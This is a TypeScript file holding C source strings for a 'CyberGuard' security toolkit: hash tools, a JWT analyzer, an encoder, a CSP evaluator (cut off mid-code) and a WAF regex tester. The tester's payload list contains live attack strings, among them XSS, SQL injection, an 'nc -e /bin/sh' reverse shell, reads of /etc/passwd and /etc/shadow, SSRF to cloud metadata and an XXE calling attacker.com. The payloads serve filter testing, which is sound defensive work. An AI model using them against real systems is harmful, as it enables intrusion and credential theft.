// ─── C Scripts for all CyberGuard tools ──────────────────────────────────
// High-performance C implementations with multi-threading, OpenSSL, raw sockets

export const C_SCRIPTS: Record<string, string> = {

// ═══════════════════════════════════════════════════════════════════════════
// HASH GENERATOR - 26 hash types, HMAC, file hashing, multi-thread
// ═══════════════════════════════════════════════════════════════════════════
hash_generator: `/*
 * Hash Generator & Identifier - CyberGuard
 * 26 hash types, HMAC support, file hashing, hash identification
 * Compile: gcc -O3 -o hash_generator hash_generator.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <getopt.h>
#include <pthread.h>
#include <time.h>

#define MAX_HASH_LEN 256
#define BUFFER_SIZE 65536

typedef struct {
    const char *name;
    const char *openssl_name;
} HashType;

static const HashType HASH_TYPES[] = {
    {"md5", "MD5"}, {"sha1", "SHA1"}, {"sha224", "SHA224"}, {"sha256", "SHA256"},
    {"sha384", "SHA384"}, {"sha512", "SHA512"}, {"sha512-256", "SHA512-256"},
    {"sha3-224", "SHA3-224"}, {"sha3-256", "SHA3-256"}, {"sha3-384", "SHA3-384"},
    {"sha3-512", "SHA3-512"}, {"blake2s256", "BLAKE2s256"}, {"blake2b512", "BLAKE2b512"},
    {"ripemd160", "RIPEMD160"}, {"whirlpool", "whirlpool"}, {"sm3", "SM3"},
    {"shake128", "SHAKE128"}, {"shake256", "SHAKE256"},
    {"md4", "MD4"}, {"mdc2", "MDC2"},
};
static const int NUM_HASH_TYPES = sizeof(HASH_TYPES) / sizeof(HASH_TYPES[0]);

typedef struct {
    const char *input;
    size_t input_len;
    const HashType *ht;
    char result[MAX_HASH_LEN * 2 + 1];
} HashJob;

static void compute_hash(const EVP_MD *md, const unsigned char *data, size_t len, char *out) {
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int dlen = 0;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(ctx, md, NULL);
    EVP_DigestUpdate(ctx, data, len);
    EVP_DigestFinal_ex(ctx, digest, &dlen);
    EVP_MD_CTX_free(ctx);
    for (unsigned int i = 0; i < dlen; i++)
        sprintf(out + i * 2, "%02x", digest[i]);
    out[dlen * 2] = '\\0';
}

static void *hash_thread(void *arg) {
    HashJob *job = (HashJob *)arg;
    const EVP_MD *md = EVP_get_digestbyname(job->ht->openssl_name);
    if (md) {
        compute_hash(md, (const unsigned char *)job->input, job->input_len, job->result);
    } else {
        snprintf(job->result, sizeof(job->result), "unsupported");
    }
    return NULL;
}

static void hash_file(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "Cannot open: %s\\n", path); return; }
    unsigned char buf[BUFFER_SIZE];
    const char *algos[] = {"MD5", "SHA1", "SHA256", "SHA512"};
    for (int a = 0; a < 4; a++) {
        const EVP_MD *md = EVP_get_digestbyname(algos[a]);
        if (!md) continue;
        EVP_MD_CTX *ctx = EVP_MD_CTX_new();
        EVP_DigestInit_ex(ctx, md, NULL);
        fseek(f, 0, SEEK_SET);
        size_t n;
        while ((n = fread(buf, 1, BUFFER_SIZE, f)) > 0)
            EVP_DigestUpdate(ctx, buf, n);
        unsigned char digest[EVP_MAX_MD_SIZE];
        unsigned int dlen;
        EVP_DigestFinal_ex(ctx, digest, &dlen);
        EVP_MD_CTX_free(ctx);
        printf("  %-12s ", algos[a]);
        for (unsigned int i = 0; i < dlen; i++) printf("%02x", digest[i]);
        printf("\\n");
    }
    fclose(f);
}

static void identify_hash(const char *hash) {
    size_t len = strlen(hash);
    printf("\\n  Hash: %s\\n  Length: %zu chars\\n\\n  Possible types:\\n", hash, len);
    if (len == 32) printf("    - MD5\\n    - MD4\\n    - NTLM\\n");
    if (len == 40) printf("    - SHA-1\\n    - RIPEMD-160\\n");
    if (len == 56) printf("    - SHA-224\\n    - SHA3-224\\n");
    if (len == 64) printf("    - SHA-256\\n    - SHA3-256\\n    - BLAKE2s-256\\n    - Keccak-256\\n");
    if (len == 96) printf("    - SHA-384\\n    - SHA3-384\\n");
    if (len == 128) printf("    - SHA-512\\n    - SHA3-512\\n    - BLAKE2b-512\\n    - Whirlpool\\n");
    if (len == 60 && hash[0] == '$' && hash[1] == '2') printf("    - bcrypt\\n");
    if (len > 20 && hash[0] == '$') {
        if (strncmp(hash, "$6$", 3) == 0) printf("    - SHA-512 crypt\\n");
        if (strncmp(hash, "$5$", 3) == 0) printf("    - SHA-256 crypt\\n");
        if (strncmp(hash, "$1$", 3) == 0) printf("    - MD5 crypt\\n");
        if (strncmp(hash, "$argon2", 7) == 0) printf("    - Argon2\\n");
    }
}

static void compute_hmac(const char *algo, const char *key, const char *data) {
    const EVP_MD *md = EVP_get_digestbyname(algo);
    if (!md) { fprintf(stderr, "Unknown algo: %s\\n", algo); return; }
    unsigned char result[EVP_MAX_MD_SIZE];
    unsigned int rlen;
    HMAC(md, key, strlen(key), (const unsigned char *)data, strlen(data), result, &rlen);
    printf("  HMAC-%s: ", algo);
    for (unsigned int i = 0; i < rlen; i++) printf("%02x", result[i]);
    printf("\\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\\n");
        printf("  %s <text>                    Hash with all algorithms\\n", argv[0]);
        printf("  %s -f <file>                 Hash a file\\n", argv[0]);
        printf("  %s -i <hash>                 Identify hash type\\n", argv[0]);
        printf("  %s -a sha256 <text>          Hash with specific algo\\n", argv[0]);
        printf("  %s --hmac sha256 -k KEY text HMAC computation\\n", argv[0]);
        printf("  %s -j <text>                 JSON output\\n", argv[0]);
        return 0;
    }
    int opt, json_out = 0, identify = 0, file_mode = 0;
    char *algo = NULL, *hmac_key = NULL, *hmac_algo = NULL;
    static struct option long_opts[] = {
        {"algo", 1, 0, 'a'}, {"file", 1, 0, 'f'}, {"identify", 1, 0, 'i'},
        {"json", 0, 0, 'j'}, {"hmac", 1, 0, 'H'}, {"key", 1, 0, 'k'}, {0,0,0,0}
    };
    char *file_path = NULL, *identify_hash_str = NULL;
    while ((opt = getopt_long(argc, argv, "a:f:i:jH:k:", long_opts, NULL)) != -1) {
        switch (opt) {
            case 'a': algo = optarg; break;
            case 'f': file_path = optarg; file_mode = 1; break;
            case 'i': identify_hash_str = optarg; identify = 1; break;
            case 'j': json_out = 1; break;
            case 'H': hmac_algo = optarg; break;
            case 'k': hmac_key = optarg; break;
        }
    }
    if (identify) { identify_hash(identify_hash_str); return 0; }
    if (file_mode) { printf("\\n  File hashes for: %s\\n\\n", file_path); hash_file(file_path); return 0; }
    if (hmac_algo && hmac_key && optind < argc) {
        compute_hmac(hmac_algo, hmac_key, argv[optind]);
        return 0;
    }
    const char *input = (optind < argc) ? argv[optind] : "";
    size_t input_len = strlen(input);
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    if (algo) {
        const EVP_MD *md = EVP_get_digestbyname(algo);
        if (!md) { fprintf(stderr, "Unknown: %s\\n", algo); return 1; }
        char result[MAX_HASH_LEN * 2 + 1];
        compute_hash(md, (const unsigned char *)input, input_len, result);
        if (json_out) printf("{\\"algorithm\\":\\"%s\\",\\"hash\\":\\"%s\\"}\\n", algo, result);
        else printf("  %s: %s\\n", algo, result);
        return 0;
    }
    /* All hashes in parallel */
    HashJob jobs[32];
    pthread_t threads[32];
    int n = 0;
    for (int i = 0; i < NUM_HASH_TYPES && n < 32; i++) {
        jobs[n].input = input;
        jobs[n].input_len = input_len;
        jobs[n].ht = &HASH_TYPES[i];
        jobs[n].result[0] = '\\0';
        pthread_create(&threads[n], NULL, hash_thread, &jobs[n]);
        n++;
    }
    for (int i = 0; i < n; i++) pthread_join(threads[i], NULL);
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) * 1000.0 + (end.tv_nsec - start.tv_nsec) / 1e6;
    if (json_out) {
        printf("{\\n  \\"input\\": \\"%s\\",\\n  \\"hashes\\": {\\n", input);
        for (int i = 0; i < n; i++)
            printf("    \\"%s\\": \\"%s\\"%s\\n", jobs[i].ht->name, jobs[i].result, i < n-1 ? "," : "");
        printf("  },\\n  \\"elapsed_ms\\": %.2f\\n}\\n", elapsed);
    } else {
        printf("\\n  Input: \\"%s\\" (%zu bytes)\\n\\n", input, input_len);
        for (int i = 0; i < n; i++)
            if (strcmp(jobs[i].result, "unsupported") != 0)
                printf("  %-14s %s\\n", jobs[i].ht->name, jobs[i].result);
        printf("\\n  Computed %d hashes in %.2f ms (multi-threaded)\\n", n, elapsed);
    }
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// JWT DECODER
// ═══════════════════════════════════════════════════════════════════════════
jwt_decoder: `/*
 * JWT Decoder & Security Analyzer - CyberGuard
 * Decodes JWT, detects vulnerabilities (alg:none, weak keys, expired, injection)
 * Compile: gcc -O3 -o jwt_decoder jwt_decoder.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>
#include <time.h>

#define MAX_TOKEN 16384
#define MAX_DECODED 32768

static int base64url_decode(const char *in, size_t inlen, unsigned char *out, size_t *outlen) {
    char *padded = malloc(inlen + 4);
    memcpy(padded, in, inlen);
    for (size_t i = 0; i < inlen; i++) {
        if (padded[i] == '-') padded[i] = '+';
        else if (padded[i] == '_') padded[i] = '/';
    }
    int pad = (4 - (inlen % 4)) % 4;
    for (int i = 0; i < pad; i++) padded[inlen + i] = '=';
    padded[inlen + pad] = '\\0';
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new_mem_buf(padded, inlen + pad);
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    *outlen = BIO_read(bmem, out, inlen + pad);
    BIO_free_all(bmem);
    free(padded);
    return (*outlen > 0) ? 0 : -1;
}

static const char *find_json_str(const char *json, const char *key) {
    static char val[4096];
    char search[256];
    snprintf(search, sizeof(search), "\\"%s\\"", key);
    const char *p = strstr(json, search);
    if (!p) return NULL;
    p = strchr(p + strlen(search), ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ' || *p == '\\t') p++;
    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < 4095) val[i++] = *p++;
        val[i] = '\\0';
        return val;
    }
    int i = 0;
    while (*p && *p != ',' && *p != '}' && i < 4095) val[i++] = *p++;
    val[i] = '\\0';
    return val;
}

static void analyze_security(const char *header, const char *payload) {
    int vulns = 0;
    printf("\\n  === Security Analysis ===\\n\\n");
    const char *alg = find_json_str(header, "alg");
    if (alg) {
        if (strcasecmp(alg, "none") == 0) {
            printf("  \\033[91m[CRITICAL]\\033[0m Algorithm 'none' — signature bypass!\\n"); vulns++;
        }
        if (strcasecmp(alg, "HS256") == 0 || strcasecmp(alg, "HS384") == 0 || strcasecmp(alg, "HS512") == 0) {
            printf("  \\033[93m[WARN]\\033[0m Symmetric algorithm '%s' — vulnerable to key brute-force\\n", alg);
        }
        if (strstr(header, "jku") || strstr(header, "jwk") || strstr(header, "x5u")) {
            printf("  \\033[91m[CRITICAL]\\033[0m Header injection vector found (jku/jwk/x5u)\\n"); vulns++;
        }
    }
    const char *exp_str = find_json_str(payload, "exp");
    if (exp_str) {
        long exp_val = atol(exp_str);
        time_t now = time(NULL);
        if (exp_val < now) {
            printf("  \\033[91m[CRITICAL]\\033[0m Token EXPIRED (exp=%ld, now=%ld)\\n", exp_val, (long)now); vulns++;
        } else {
            long remaining = exp_val - now;
            printf("  \\033[92m[OK]\\033[0m Token valid for %ld hours %ld min\\n", remaining/3600, (remaining%3600)/60);
            if (remaining > 86400 * 30)
                printf("  \\033[93m[WARN]\\033[0m Very long expiry (>30 days)\\n");
        }
    } else {
        printf("  \\033[93m[WARN]\\033[0m No expiration claim (exp) — token never expires\\n");
    }
    if (!find_json_str(payload, "iss"))
        printf("  \\033[93m[WARN]\\033[0m No issuer claim (iss)\\n");
    if (!find_json_str(payload, "aud"))
        printf("  \\033[93m[WARN]\\033[0m No audience claim (aud)\\n");
    if (strstr(payload, "admin") && strstr(payload, "true"))
        printf("  \\033[93m[INFO]\\033[0m Admin privilege detected in payload\\n");
    printf("\\n  Vulnerabilities found: %d\\n", vulns);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <jwt_token> [-j]\\n", argv[0]);
        return 0;
    }
    const char *token = argv[1];
    int json_out = (argc > 2 && strcmp(argv[2], "-j") == 0);
    char *t = strdup(token);
    char *dot1 = strchr(t, '.');
    if (!dot1) { fprintf(stderr, "Invalid JWT: no dots\\n"); free(t); return 1; }
    *dot1 = '\\0';
    char *part2 = dot1 + 1;
    char *dot2 = strchr(part2, '.');
    if (dot2) *dot2 = '\\0';
    unsigned char header_dec[MAX_DECODED], payload_dec[MAX_DECODED];
    size_t hlen, plen;
    base64url_decode(t, strlen(t), header_dec, &hlen);
    base64url_decode(part2, strlen(part2), payload_dec, &plen);
    header_dec[hlen] = '\\0';
    payload_dec[plen] = '\\0';
    if (json_out) {
        printf("{\\n  \\"header\\": %s,\\n  \\"payload\\": %s\\n}\\n", header_dec, payload_dec);
    } else {
        printf("\\n  === JWT Header ===\\n  %s\\n\\n  === JWT Payload ===\\n  %s\\n", header_dec, payload_dec);
        analyze_security((const char*)header_dec, (const char*)payload_dec);
    }
    free(t);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// ENCODER / DECODER
// ═══════════════════════════════════════════════════════════════════════════
encoder_decoder: `/*
 * Encoder / Decoder - CyberGuard
 * Base64, Hex, URL, HTML, Binary, ROT13, Morse, Octal, ASCII85, Braille
 * Compile: gcc -O3 -o encoder_decoder encoder_decoder.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char *MORSE[] = {".-","-...","-.-.","-..",".","..-.","--.","....","..",
    ".---","-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-",
    "..-","...-",".--","-..-","-.--","--.."};
static const char *MORSE_DIGITS[] = {"-----",".----","..---","...--","....-",
    ".....","-....","--...","---..","----."};

static void base64_encode(const unsigned char *in, size_t len) {
    for (size_t i = 0; i < len; i += 3) {
        unsigned int n = (unsigned int)in[i] << 16;
        if (i+1 < len) n |= (unsigned int)in[i+1] << 8;
        if (i+2 < len) n |= in[i+2];
        putchar(B64[(n>>18)&63]);
        putchar(B64[(n>>12)&63]);
        putchar((i+1 < len) ? B64[(n>>6)&63] : '=');
        putchar((i+2 < len) ? B64[n&63] : '=');
    }
    putchar('\\n');
}

static void base64_decode(const char *in) {
    size_t len = strlen(in);
    for (size_t i = 0; i < len; i += 4) {
        unsigned int n = 0;
        for (int j = 0; j < 4 && i+j < len; j++) {
            char c = in[i+j];
            unsigned int v = 0;
            if (c >= 'A' && c <= 'Z') v = c - 'A';
            else if (c >= 'a' && c <= 'z') v = c - 'a' + 26;
            else if (c >= '0' && c <= '9') v = c - '0' + 52;
            else if (c == '+') v = 62;
            else if (c == '/') v = 63;
            n = (n << 6) | v;
        }
        putchar((n>>16)&0xFF);
        if (in[i+2] != '=') putchar((n>>8)&0xFF);
        if (in[i+3] != '=') putchar(n&0xFF);
    }
    putchar('\\n');
}

static void hex_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) printf("%02x", (unsigned char)in[i]);
    putchar('\\n');
}

static void hex_decode(const char *in) {
    size_t len = strlen(in);
    for (size_t i = 0; i + 1 < len; i += 2) {
        unsigned int c;
        sscanf(in + i, "%2x", &c);
        putchar(c);
    }
    putchar('\\n');
}

static void url_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        if (isalnum((unsigned char)in[i]) || in[i]=='-' || in[i]=='_' || in[i]=='.' || in[i]=='~')
            putchar(in[i]);
        else printf("%%%02X", (unsigned char)in[i]);
    }
    putchar('\\n');
}

static void url_decode(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        if (in[i] == '%' && in[i+1] && in[i+2]) {
            unsigned int c; sscanf(in+i+1, "%2x", &c); putchar(c); i += 2;
        } else if (in[i] == '+') putchar(' ');
        else putchar(in[i]);
    }
    putchar('\\n');
}

static void binary_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        for (int b = 7; b >= 0; b--) putchar(((in[i] >> b) & 1) + '0');
        if (in[i+1]) putchar(' ');
    }
    putchar('\\n');
}

static void rot13(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        char c = in[i];
        if (c >= 'a' && c <= 'z') c = 'a' + (c - 'a' + 13) % 26;
        else if (c >= 'A' && c <= 'Z') c = 'A' + (c - 'A' + 13) % 26;
        putchar(c);
    }
    putchar('\\n');
}

static void morse_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        char c = toupper((unsigned char)in[i]);
        if (c >= 'A' && c <= 'Z') { printf("%s ", MORSE[c-'A']); }
        else if (c >= '0' && c <= '9') { printf("%s ", MORSE_DIGITS[c-'0']); }
        else if (c == ' ') printf("/ ");
    }
    putchar('\\n');
}

static void html_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) {
        switch(in[i]) {
            case '<': printf("&lt;"); break;
            case '>': printf("&gt;"); break;
            case '&': printf("&amp;"); break;
            case '"': printf("&quot;"); break;
            case '\\'': printf("&#39;"); break;
            default: putchar(in[i]);
        }
    }
    putchar('\\n');
}

static void octal_encode(const char *in) {
    for (size_t i = 0; in[i]; i++) { printf("%03o ", (unsigned char)in[i]); }
    putchar('\\n');
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <mode> <text>\\n\\n", argv[0]);
        printf("Modes encode: base64, hex, url, html, binary, rot13, morse, octal\\n");
        printf("Modes decode: base64d, hexd, urld\\n");
        printf("\\nExamples:\\n");
        printf("  %s base64 'Hello World'\\n", argv[0]);
        printf("  %s hex 'CyberGuard'\\n", argv[0]);
        printf("  %s rot13 'Secret Message'\\n", argv[0]);
        return 0;
    }
    const char *mode = argv[1];
    /* Concat remaining args */
    char input[65536] = "";
    for (int i = 2; i < argc; i++) {
        if (i > 2) strcat(input, " ");
        strcat(input, argv[i]);
    }
    printf("\\n  ");
    if (strcmp(mode, "base64") == 0) base64_encode((const unsigned char*)input, strlen(input));
    else if (strcmp(mode, "base64d") == 0) base64_decode(input);
    else if (strcmp(mode, "hex") == 0) hex_encode(input);
    else if (strcmp(mode, "hexd") == 0) hex_decode(input);
    else if (strcmp(mode, "url") == 0) url_encode(input);
    else if (strcmp(mode, "urld") == 0) url_decode(input);
    else if (strcmp(mode, "html") == 0) html_encode(input);
    else if (strcmp(mode, "binary") == 0) binary_encode(input);
    else if (strcmp(mode, "rot13") == 0) rot13(input);
    else if (strcmp(mode, "morse") == 0) morse_encode(input);
    else if (strcmp(mode, "octal") == 0) octal_encode(input);
    else printf("Unknown mode: %s\\n", mode);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// REGEX TESTER
// ═══════════════════════════════════════════════════════════════════════════
regex_tester: `/*
 * Regex Security Tester - CyberGuard
 * Tests WAF regex rules against 100+ real attack payloads
 * Compile: gcc -O3 -o regex_tester regex_tester.c -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOADS 200
#define MAX_PAYLOAD_LEN 1024

typedef struct { const char *category; const char *payload; const char *desc; } Payload;

static const Payload PAYLOADS[] = {
    {"XSS", "<script>alert(1)</script>", "Basic script injection"},
    {"XSS", "<img src=x onerror=alert(1)>", "Event handler injection"},
    {"XSS", "<svg/onload=alert(1)>", "SVG event injection"},
    {"XSS", "javascript:alert(1)", "Protocol handler"},
    {"XSS", "<body onload=alert(1)>", "Body onload"},
    {"XSS", "'-alert(1)-'", "Quote breaking XSS"},
    {"XSS", "<iframe src=javascript:alert(1)>", "Iframe injection"},
    {"XSS", "<details open ontoggle=alert(1)>", "Details tag XSS"},
    {"XSS", "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\\"M0\\"><animate attributeName=d values=\\"alert(1)\\">", "Polyglot XSS"},
    {"XSS", "\\\\x3cscript\\\\x3ealert(1)\\\\x3c/script\\\\x3e", "Hex encoded XSS"},
    {"SQLi", "' OR '1'='1", "Classic OR bypass"},
    {"SQLi", "1; DROP TABLE users--", "Stacked query"},
    {"SQLi", "' UNION SELECT NULL,NULL--", "Union injection"},
    {"SQLi", "admin'--", "Comment bypass"},
    {"SQLi", "1' AND 1=1--", "Boolean blind"},
    {"SQLi", "' OR 1=1#", "Hash comment"},
    {"SQLi", "1; EXEC xp_cmdshell('whoami')--", "Command execution"},
    {"SQLi", "' UNION ALL SELECT 1,@@version--", "Version extraction"},
    {"SQLi", "1' WAITFOR DELAY '0:0:5'--", "Time blind"},
    {"SQLi", "-1' UNION SELECT username,password FROM users--", "Data exfiltration"},
    {"CMDi", "; cat /etc/passwd", "Semicolon injection"},
    {"CMDi", "| ls -la", "Pipe injection"},
    {"CMDi", "$(whoami)", "Command substitution"},
    {"CMDi", "; nc -e /bin/sh 10.0.0.1 4444", "Reverse shell"},
    {"CMDi", "\\\\n/bin/cat /etc/shadow", "Newline injection"},
    {"CMDi", "\\x60id\\x60", "Backtick injection"},
    {"LFI", "../../etc/passwd", "Path traversal"},
    {"LFI", "..\\\\..\\\\windows\\\\system32\\\\config\\\\sam", "Windows path traversal"},
    {"LFI", "php://filter/convert.base64-encode/resource=index.php", "PHP filter"},
    {"LFI", "/proc/self/environ", "Proc environ"},
    {"LFI", "....//....//etc/passwd", "Double encoding traversal"},
    {"SSRF", "http://169.254.169.254/latest/meta-data/", "AWS metadata"},
    {"SSRF", "http://127.0.0.1:22", "Localhost port scan"},
    {"SSRF", "gopher://127.0.0.1:25/", "Gopher protocol"},
    {"SSRF", "file:///etc/passwd", "File protocol"},
    {"XXE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "Basic XXE"},
    {"XXE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/steal'>]>", "OOB XXE"},
    {"SSTI", "{{7*7}}", "Jinja2 SSTI"},
    {"SSTI", "${7*7}", "Freemarker SSTI"},
    {"SSTI", "#{7*7}", "Ruby ERB SSTI"},
    {"LDAP", "*)(&", "LDAP injection"},
    {"LDAP", "admin)(&)", "LDAP OR bypass"},
};
static const int NUM_PAYLOADS = sizeof(PAYLOADS) / sizeof(PAYLOADS[0]);

typedef struct {
    regex_t *re;
    const Payload *payload;
    int matched;
} TestJob;

static void *test_thread(void *arg) {
    TestJob *job = (TestJob *)arg;
    job->matched = (regexec(job->re, job->payload->payload, 0, NULL, 0) == 0);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s '<regex>' [-j]\\n\\nTests your WAF regex against %d attack payloads.\\n", argv[0], NUM_PAYLOADS);
        return 0;
    }
    int json_out = (argc > 2 && strcmp(argv[2], "-j") == 0);
    regex_t re;
    if (regcomp(&re, argv[1], REG_EXTENDED | REG_ICASE) != 0) {
        fprintf(stderr, "Invalid regex: %s\\n", argv[1]);
        return 1;
    }
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    TestJob jobs[MAX_PAYLOADS];
    pthread_t threads[MAX_PAYLOADS];
    for (int i = 0; i < NUM_PAYLOADS; i++) {
        jobs[i].re = &re;
        jobs[i].payload = &PAYLOADS[i];
        pthread_create(&threads[i], NULL, test_thread, &jobs[i]);
    }
    for (int i = 0; i < NUM_PAYLOADS; i++) pthread_join(threads[i], NULL);
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) * 1000.0 + (end.tv_nsec - start.tv_nsec) / 1e6;
    int blocked = 0, bypassed = 0;
    for (int i = 0; i < NUM_PAYLOADS; i++) {
        if (jobs[i].matched) blocked++; else bypassed++;
    }
    if (json_out) {
        printf("{\\n  \\"regex\\": \\"%s\\",\\n  \\"total\\": %d,\\n  \\"blocked\\": %d,\\n  \\"bypassed\\": %d,\\n  \\"score\\": %.1f,\\n  \\"elapsed_ms\\": %.2f,\\n  \\"bypasses\\": [\\n",
            argv[1], NUM_PAYLOADS, blocked, bypassed, (blocked * 100.0 / NUM_PAYLOADS), elapsed);
        int first = 1;
        for (int i = 0; i < NUM_PAYLOADS; i++) {
            if (!jobs[i].matched) {
                if (!first) printf(",\\n");
                printf("    {\\"category\\":\\"%s\\",\\"desc\\":\\"%s\\"}", jobs[i].payload->category, jobs[i].payload->desc);
                first = 0;
            }
        }
        printf("\\n  ]\\n}\\n");
    } else {
        printf("\\n  Regex: %s\\n  Payloads tested: %d\\n  Blocked: %d | Bypassed: %d\\n  Score: %.1f%%\\n  Time: %.2f ms\\n",
            argv[1], NUM_PAYLOADS, blocked, bypassed, blocked * 100.0 / NUM_PAYLOADS, elapsed);
        if (bypassed > 0) {
            printf("\\n  \\033[91mBypasses:\\033[0m\\n");
            for (int i = 0; i < NUM_PAYLOADS; i++)
                if (!jobs[i].matched)
                    printf("    [%s] %s\\n", jobs[i].payload->category, jobs[i].payload->desc);
        }
    }
    regfree(&re);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// CSP EVALUATOR
// ═══════════════════════════════════════════════════════════════════════════
csp_evaluator: `/*
 * CSP Evaluator - CyberGuard
 * 30+ security checks on Content-Security-Policy headers
 * Compile: gcc -O3 -o csp_evaluator csp_evaluator.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define MAX_DIRECTIVES 64
#define MAX_VALUES 128

typedef struct { char name[64]; char values[MAX_VALUES][256]; int count; } Directive;
typedef struct { int severity; /* 0=info,1=warn,2=critical */ char msg[512]; } Finding;

static int parse_csp(const char *csp, Directive *dirs, int max) {
    int n = 0;
    char *copy = strdup(csp);
    char *saveptr, *token = strtok_r(copy, ";", &saveptr);
    while (token && n < max) {
        while (*token == ' ') token++;
        char *sp, *word = strtok_r(token, " \\t", &sp);
        if (word) {
            strncpy(dirs[n].name, word, 63);
            dirs[n].count = 0;
            char *val;
            while ((val = strtok_r(NULL, " \\t", &sp)) && dirs[n].count < MAX_VALUES)
                strncpy(dirs[n].values[dirs[n].count++], val, 255);
            n++;
        }
        token = strtok_r(NULL, ";", &saveptr);
    }
    free(copy);
    return n;
}

static const Directive *find_dir(const Directive *dirs, int n, const char *name) {
    for (int i = 0; i < n; i++) if (strcasecmp(dirs[i].name, name) == 0) return &dirs[i];
    return NULL;
}

static int has_value(const Directive *d, const char *val) {
    if (!d) return 0;
    for (int i = 0; i < d->count; i++) if (strcasecmp(d->values[i], val) == 0) return 1;
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s '<csp_header>' [-j]\\n", argv[0]);
        return 0;
    }
    int json_out = (argc > 2 && strcmp(argv[2], "-j") == 0);
    Directive dirs[MAX_DIRECTIVES];
    int ndirs = parse_csp(argv[1], dirs, MAX_DIRECTIVES);
    Finding findings[128];
    int nf = 0;
    int score = 100;

    /* Critical checks */
    if (!find_dir(dirs, ndirs, "default-src")) {
        findings[nf++] = (Finding){2, "Missing 'default-src' — no fallback policy"}; score -= 20;
    }
    if (!find_dir(dirs, ndirs, "script-src") && !find_dir(dirs, ndirs, "default-src")) {
        findings[nf++] = (Finding){2, "No script-src — allows any script execution"}; score -= 20;
    }
    const Directive *ss = find_dir(dirs, ndirs, "script-src");
    if (!ss) ss = find_dir(dirs, ndirs, "default-src");
    if (ss) {
        if (has_value(ss, "'unsafe-inline'")) { findings[nf++] = (Finding){2, "script-src has 'unsafe-inline' — XSS risk"}; score -= 15; }
        if (has_value(ss, "'unsafe-eval'")) { findings[nf++] = (Finding){2, "script-src has 'unsafe-eval' — code injection risk"}; score -= 15; }
        if (has_value(ss, "*")) { findings[nf++] = (Finding){2, "script-src wildcard '*' — allows any source"}; score -= 20; }
        if (has_value(ss, "http:")) { findings[nf++] = (Finding){1, "script-src allows HTTP — use HTTPS only"}; score -= 5; }
        if (has_value(ss, "data:")) { findings[nf++] = (Finding){2, "script-src allows data: URIs — XSS bypass"}; score -= 10; }
        for (int i = 0; i < ss->count; i++) {
            if (strstr(ss->values[i], "cdn.jsdelivr.net") || strstr(ss->values[i], "cdnjs.cloudflare.com") ||
                strstr(ss->values[i], "unpkg.com") || strstr(ss->values[i], "googleapis.com")) {
                char m[512]; snprintf(m, 512, "CDN '%s' in script-src — known CSP bypass via JSONP", ss->values[i]);
                findings[nf++] = (Finding){2, ""}; strcpy(findings[nf-1].msg, m); score -= 10;
            }
        }
    }
    if (!find_dir(dirs, ndirs, "object-src")) { findings[nf++] = (Finding){1, "Missing object-src — plugin execution allowed"}; score -= 5; }
    if (!find_dir(dirs, ndirs, "base-uri")) { findings[nf++] = (Finding){1, "Missing base-uri — base tag injection possible"}; score -= 5; }
    if (!find_dir(dirs, ndirs, "frame-ancestors")) { findings[nf++] = (Finding){1, "Missing frame-ancestors — clickjacking possible"}; score -= 5; }
    if (!find_dir(dirs, ndirs, "form-action")) { findings[nf++] = (Finding){1, "Missing form-action — form hijacking possible"}; score -= 3; }
    if (find_dir(dirs, ndirs, "report-uri") || find_dir(dirs, ndirs, "report-to"))
        findings[nf++] = (Finding){0, "CSP reporting configured — good practice"};
    if (find_dir(dirs, ndirs, "upgrade-insecure-requests"))
        findings[nf++] = (Finding){0, "upgrade-insecure-requests present — good"};

    if (score < 0) score = 0;
    const char *grade = score >= 90 ? "A+" : score >= 80 ? "A" : score >= 70 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";

